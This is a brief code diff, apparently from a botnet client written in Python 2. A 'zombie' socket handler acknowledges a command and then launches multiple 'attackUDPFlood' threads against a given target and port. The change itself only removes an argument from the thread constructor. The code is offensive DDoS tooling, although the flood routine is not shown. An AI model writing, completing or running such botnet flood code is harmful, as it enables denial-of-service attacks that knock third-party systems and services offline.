@@ -14,7 +14,7 @@ class zombie(SocketServer.BaseRequestHandler):
         self.request.sendall("ACK")
 
         for i in xrange(N):
-            attack = attackUDPFlood(timeout, target, port, i)
+            attack = attackUDPFlood(timeout, target, port)
             attack.start()
 
 class attackUDPFlood(threading.Thread):
